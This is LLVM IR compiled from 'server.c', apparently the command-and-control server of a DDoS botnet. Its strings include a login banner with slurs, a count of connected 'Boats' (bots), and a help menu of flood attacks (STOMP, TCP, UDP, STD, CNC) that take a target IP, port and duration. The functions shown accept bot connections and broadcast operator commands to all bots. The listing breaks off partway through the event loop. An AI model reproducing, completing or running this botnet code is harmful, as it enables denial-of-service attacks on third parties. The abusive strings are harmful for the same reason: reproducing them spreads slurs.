; ModuleID = 'server.c'
source_filename = "server.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, i8 }
%struct.telnetdata_t = type { i32 }
%struct.login_info = type { [100 x i8], [100 x i8] }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = dso_local global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [8 x i8] c"\1B[0;34m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.4 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.5 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@scannerreport = internal global i32 0, align 4
@.str.8 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.9 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.10 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@.str.11 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.12 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.13 = private unnamed_addr constant [18 x i8] c"%c]0; %d Boats %c\00", align 1
@OperatorsConnected = internal global i32 0, align 4
@.str.14 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@accounts = internal global [100 x %struct.login_info] zeroinitializer, align 16
@.str.15 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.16 = private unnamed_addr constant [22 x i8] c"\1B[97mGay Username ~  \00", align 1
@.str.17 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.18 = private unnamed_addr constant [22 x i8] c"\1B[97mGay Password ~  \00", align 1
@.str.19 = private unnamed_addr constant [45 x i8] c"Welcome [%s] we're openning the hell gates\0D\0A\00", align 1
@.str.20 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.21 = private unnamed_addr constant [4 x i8] c" \0D\0A\00", align 1
@.str.22 = private unnamed_addr constant [76 x i8] c"\1B[92m          - - - - - - - - - - - - - - - - - - - - - - - - - - - \1B[0m\0D\0A\00", align 1
@.str.23 = private unnamed_addr constant [105 x i8] c"         [\1B[97m\E3\83\8F\E3\82\A4\E3\83\96\E3\83\AA\E3\83\83\E3\83\89\1B[0m] \1B[97m       Custom Source   \1B[0m[\1B[97m\E3\83\8F\E3\82\A4\E3\83\96\E3\83\AA\E3\83\83\E3\83\89\1B[0m]  \0D\0A\00", align 1
@.str.24 = private unnamed_addr constant [84 x i8] c"\1B[92m          - - - - - - - - -\1B[0m\1B[97m @zerlho  \1B[92m- - - - - - - - - -\1B[0m  \0D\0A\00", align 1
@.str.25 = private unnamed_addr constant [85 x i8] c"\1B[92m          - - - - - - - - -\1B[0m\1B[97m @cerberus \1B[92m- - - - - - - - - -\1B[0m  \0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [93 x i8] c"\1B[92m          - - - - - - - - -\1B[0m\1B[97m We pump pump!!!  \1B[92m- - - - - - - - - -\1B[0m   \0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [90 x i8] c"\1B[92m          - - - - - - - - -\1B[0m\1B[97m  help for help \1B[92m- - - - - - - - - -\1B[0m  \0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [102 x i8] c"\1B[92m          - - - - - - - - - - - - - - - - - - - - - - - - - - - \1B[0m                          \0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [32 x i8] c"\1B[97m%s\1B[97m@\1B[92mHellGate  ~  \00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.31 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.32 = private unnamed_addr constant [2 x i8] c"?\00", align 1
@.str.33 = private unnamed_addr constant [70 x i8] c"\1B[92m*** STOMP ~ !* STOMP [ip] [port] [time] [32] [all] [1460] [10]\0D\0A\00", align 1
@.str.34 = private unnamed_addr constant [66 x i8] c"\1B[92m*** TCP ~ !* TCP [ip] [port] [time] [32] [all] [1460] [10]\0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [61 x i8] c"\1B[92m*** UDP ~ !* UDP [ip] [port] [time] [32] [1460] [10] \0D\0A\00", align 1
@.str.36 = private unnamed_addr constant [47 x i8] c"\1B[92m*** STD ~ !* STD [ip] [port] [time]\1B[0m\0D\0A\00", align 1
@.str.37 = private unnamed_addr constant [47 x i8] c"\1B[92m*** CNC ~ !* CNC [ip] [port] [time]\1B[0m\0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.39 = private unnamed_addr constant [6 x i8] c"clear\00", align 1
@.str.40 = private unnamed_addr constant [4 x i8] c"cls\00", align 1
@.str.41 = private unnamed_addr constant [4 x i8] c"CLS\00", align 1
@.str.42 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"user.log\00", align 1
@.str.44 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.45 = private unnamed_addr constant [9 x i8] c"%I:%M %p\00", align 1
@.str.46 = private unnamed_addr constant [13 x i8] c"[%s] %s: %s\0A\00", align 1
@.str.47 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.48 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.49 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.50 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.51 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.52 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.53 = private unnamed_addr constant [5 x i8] c"ZERO\00", align 1
@.str.54 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.55 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.56 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.57 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !6

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #8
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #8
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @broadcast(i8* %0, i32 %1, i8* %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %17

16:                                               ; preds = %3
  store i32 0, i32* %7, align 4
  br label %17

17:                                               ; preds = %16, %3
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @strlen(i8* %18) #8
  %20 = add i64 %19, 10
  %21 = call noalias align 16 i8* @malloc(i64 %20) #9
  store i8* %21, i8** %8, align 8
  %22 = load i8*, i8** %8, align 8
  %23 = load i8*, i8** %4, align 8
  %24 = call i64 @strlen(i8* %23) #8
  %25 = add i64 %24, 10
  call void @llvm.memset.p0i8.i64(i8* align 1 %22, i8 0, i64 %25, i1 false)
  %26 = load i8*, i8** %8, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call i8* @strcpy(i8* %26, i8* %27) #9
  %29 = load i8*, i8** %8, align 8
  call void @trim(i8* %29)
  %30 = call i64 @time(i64* %9) #9
  %31 = call %struct.tm* @localtime(i64* %9) #9
  store %struct.tm* %31, %struct.tm** %10, align 8
  %32 = load %struct.tm*, %struct.tm** %10, align 8
  %33 = call i8* @asctime(%struct.tm* %32) #9
  store i8* %33, i8** %11, align 8
  %34 = load i8*, i8** %11, align 8
  call void @trim(i8* %34)
  store i32 0, i32* %12, align 4
  br label %35

35:                                               ; preds = %78, %17
  %36 = load i32, i32* %12, align 4
  %37 = icmp slt i32 %36, 1000000
  br i1 %37, label %38, label %81

38:                                               ; preds = %35
  %39 = load i32, i32* %12, align 4
  %40 = load i32, i32* %5, align 4
  %41 = icmp eq i32 %39, %40
  br i1 %41, label %49, label %42

42:                                               ; preds = %38
  %43 = load i32, i32* %12, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44
  %46 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %45, i32 0, i32 1
  %47 = load i8, i8* %46, align 4
  %48 = icmp ne i8 %47, 0
  br i1 %48, label %50, label %49

49:                                               ; preds = %42, %38
  br label %78

50:                                               ; preds = %42
  %51 = load i32, i32* %7, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %70

53:                                               ; preds = %50
  %54 = load i32, i32* %12, align 4
  %55 = sext i32 %54 to i64
  %56 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %55
  %57 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %56, i32 0, i32 0
  %58 = load i32, i32* %57, align 4
  %59 = icmp ne i32 %58, 0
  br i1 %59, label %60, label %70

60:                                               ; preds = %53
  %61 = load i32, i32* %12, align 4
  %62 = call i64 @send(i32 %61, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i64 0, i64 0), i64 9, i32 16384)
  %63 = load i32, i32* %12, align 4
  %64 = load i8*, i8** %6, align 8
  %65 = load i8*, i8** %6, align 8
  %66 = call i64 @strlen(i8* %65) #8
  %67 = call i64 @send(i32 %63, i8* %64, i64 %66, i32 16384)
  %68 = load i32, i32* %12, align 4
  %69 = call i64 @send(i32 %68, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i64 2, i32 16384)
  br label %70

70:                                               ; preds = %60, %53, %50
  %71 = load i32, i32* %12, align 4
  %72 = load i8*, i8** %4, align 8
  %73 = load i8*, i8** %4, align 8
  %74 = call i64 @strlen(i8* %73) #8
  %75 = call i64 @send(i32 %71, i8* %72, i64 %74, i32 16384)
  %76 = load i32, i32* %12, align 4
  %77 = call i64 @send(i32 %76, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.3, i64 0, i64 0), i64 1, i32 16384)
  br label %78

78:                                               ; preds = %70, %49
  %79 = load i32, i32* %12, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %12, align 4
  br label %35, !llvm.loop !11

81:                                               ; preds = %35
  %82 = load i8*, i8** %8, align 8
  call void @free(i8* %82) #9
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotEventLoop(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.clientdata_t*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %20 = call noalias align 16 i8* @calloc(i64 1000000, i64 12) #9
  %21 = bitcast i8* %20 to %struct.epoll_event*
  store %struct.epoll_event* %21, %struct.epoll_event** %4, align 8
  br label %22

22:                                               ; preds = %1, %265
  %23 = load volatile i32, i32* @epollFD, align 4
  %24 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %25 = call i32 @epoll_wait(i32 %23, %struct.epoll_event* %24, i32 1000000, i32 -1)
  store i32 %25, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %26

26:                                               ; preds = %262, %22
  %27 = load i32, i32* %7, align 4
  %28 = load i32, i32* %6, align 4
  %29 = icmp slt i32 %27, %28
  br i1 %29, label %30, label %265

30:                                               ; preds = %26
  %31 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %32 = load i32, i32* %7, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %31, i64 %33
  %35 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %34, i32 0, i32 0
  %36 = load i32, i32* %35, align 1
  %37 = and i32 %36, 8
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %57, label %39

39:                                               ; preds = %30
  %40 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %40, i64 %42
  %44 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %43, i32 0, i32 0
  %45 = load i32, i32* %44, align 1
  %46 = and i32 %45, 16
  %47 = icmp ne i32 %46, 0
  br i1 %47, label %57, label %48

48:                                               ; preds = %39
  %49 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %50 = load i32, i32* %7, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %49, i64 %51
  %53 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %52, i32 0, i32 0
  %54 = load i32, i32* %53, align 1
  %55 = and i32 %54, 1
  %56 = icmp ne i32 %55, 0
  br i1 %56, label %76, label %57

57:                                               ; preds = %48, %39, %30
  %58 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %59 = load i32, i32* %7, align 4
  %60 = sext i32 %59 to i64
  %61 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %58, i64 %60
  %62 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %61, i32 0, i32 1
  %63 = bitcast %union.epoll_data* %62 to i32*
  %64 = load i32, i32* %63, align 1
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %65
  %67 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %66, i32 0, i32 1
  store i8 0, i8* %67, align 4
  %68 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %69 = load i32, i32* %7, align 4
  %70 = sext i32 %69 to i64
  %71 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %68, i64 %70
  %72 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %71, i32 0, i32 1
  %73 = bitcast %union.epoll_data* %72 to i32*
  %74 = load i32, i32* %73, align 1
  %75 = call i32 @close(i32 %74)
  br label %262

76:                                               ; preds = %48
  %77 = load volatile i32, i32* @listenFD, align 4
  %78 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %79 = load i32, i32* %7, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %78, i64 %80
  %82 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %81, i32 0, i32 1
  %83 = bitcast %union.epoll_data* %82 to i32*
  %84 = load i32, i32* %83, align 1
  %85 = icmp eq i32 %77, %84
  br i1 %85, label %86, label %170

86:                                               ; preds = %76
  br label %87

87:                                               ; preds = %86, %164
  store i32 16, i32* %9, align 4
  %88 = load volatile i32, i32* @listenFD, align 4
  %89 = call i32 @accept(i32 %88, %struct.sockaddr* %8, i32* %9)
  store i32 %89, i32* %10, align 4
  %90 = load i32, i32* %10, align 4
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %102

92:                                               ; preds = %87
  %93 = call i32* @__errno_location() #10
  %94 = load i32, i32* %93, align 4
  %95 = icmp eq i32 %94, 11
  br i1 %95, label %100, label %96

96:                                               ; preds = %92
  %97 = call i32* @__errno_location() #10
  %98 = load i32, i32* %97, align 4
  %99 = icmp eq i32 %98, 11
  br i1 %99, label %100, label %101

100:                                              ; preds = %96, %92
  br label %169

101:                                              ; preds = %96
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  br label %169

102:                                              ; preds = %87
  %103 = bitcast %struct.sockaddr* %8 to %struct.sockaddr_in*
  %104 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %103, i32 0, i32 2
  %105 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %104, i32 0, i32 0
  %106 = load i32, i32* %105, align 2
  %107 = load i32, i32* %10, align 4
  %108 = sext i32 %107 to i64
  %109 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %108
  %110 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %109, i32 0, i32 0
  store i32 %106, i32* %110, align 8
  store i32 0, i32* %12, align 4
  store i32 0, i32* %11, align 4
  br label %111

111:                                              ; preds = %140, %102
  %112 = load i32, i32* %11, align 4
  %113 = icmp slt i32 %112, 1000000
  br i1 %113, label %114, label %143

114:                                              ; preds = %111
  %115 = load i32, i32* %11, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %116
  %118 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %117, i32 0, i32 1
  %119 = load i8, i8* %118, align 4
  %120 = icmp ne i8 %119, 0
  br i1 %120, label %121, label %125

121:                                              ; preds = %114
  %122 = load i32, i32* %11, align 4
  %123 = load i32, i32* %10, align 4
  %124 = icmp eq i32 %122, %123
  br i1 %124, label %125, label %126

125:                                              ; preds = %121, %114
  br label %140

126:                                              ; preds = %121
  %127 = load i32, i32* %11, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %128
  %130 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %129, i32 0, i32 0
  %131 = load i32, i32* %130, align 8
  %132 = load i32, i32* %10, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %133
  %135 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %134, i32 0, i32 0
  %136 = load i32, i32* %135, align 8
  %137 = icmp eq i32 %131, %136
  br i1 %137, label %138, label %139

138:                                              ; preds = %126
  store i32 1, i32* %12, align 4
  br label %143

139:                                              ; preds = %126
  br label %140

140:                                              ; preds = %139, %125
  %141 = load i32, i32* %11, align 4
  %142 = add nsw i32 %141, 1
  store i32 %142, i32* %11, align 4
  br label %111, !llvm.loop !12

143:                                              ; preds = %138, %111
  %144 = load i32, i32* %10, align 4
  %145 = call i32 @make_socket_non_blocking(i32 %144)
  store i32 %145, i32* %5, align 4
  %146 = load i32, i32* %5, align 4
  %147 = icmp eq i32 %146, -1
  br i1 %147, label %148, label %151

148:                                              ; preds = %143
  %149 = load i32, i32* %10, align 4
  %150 = call i32 @close(i32 %149)
  br label %169

151:                                              ; preds = %143
  %152 = load i32, i32* %10, align 4
  %153 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 1
  %154 = bitcast %union.epoll_data* %153 to i32*
  store i32 %152, i32* %154, align 1
  %155 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %3, i32 0, i32 0
  store i32 -2147483647, i32* %155, align 1
  %156 = load volatile i32, i32* @epollFD, align 4
  %157 = load i32, i32* %10, align 4
  %158 = call i32 @epoll_ctl(i32 %156, i32 1, i32 %157, %struct.epoll_event* %3) #9
  store i32 %158, i32* %5, align 4
  %159 = load i32, i32* %5, align 4
  %160 = icmp eq i32 %159, -1
  br i1 %160, label %161, label %164

161:                                              ; preds = %151
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i64 0, i64 0))
  %162 = load i32, i32* %10, align 4
  %163 = call i32 @close(i32 %162)
  br label %169

164:                                              ; preds = %151
  %165 = load i32, i32* %10, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %166
  %168 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %167, i32 0, i32 1
  store i8 1, i8* %168, align 4
  br label %87

169:                                              ; preds = %161, %148, %101, %100
  br label %262

170:                                              ; preds = %76
  %171 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %172 = load i32, i32* %7, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %171, i64 %173
  %175 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %174, i32 0, i32 1
  %176 = bitcast %union.epoll_data* %175 to i32*
  %177 = load i32, i32* %176, align 1
  store i32 %177, i32* %13, align 4
  %178 = load i32, i32* %13, align 4
  %179 = sext i32 %178 to i64
  %180 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %179
  store %struct.clientdata_t* %180, %struct.clientdata_t** %14, align 8
  store i32 0, i32* %15, align 4
  %181 = load %struct.clientdata_t*, %struct.clientdata_t** %14, align 8
  %182 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %181, i32 0, i32 1
  store i8 1, i8* %182, align 4
  br label %183

183:                                              ; preds = %170, %258
  %184 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %184, i8 0, i64 2048, i1 false)
  br label %185

185:                                              ; preds = %233, %232, %225, %217, %211, %183
  %186 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %186, i8 0, i64 2048, i1 false)
  %187 = icmp ne i8* %186, null
  br i1 %187, label %188, label %194

188:                                              ; preds = %185
  %189 = getelementptr inbounds [2048 x i8], [2048 x i8]* %17, i64 0, i64 0
  %190 = load i32, i32* %13, align 4
  %191 = call i32 @fdgets(i8* %189, i32 2048, i32 %190)
  %192 = sext i32 %191 to i64
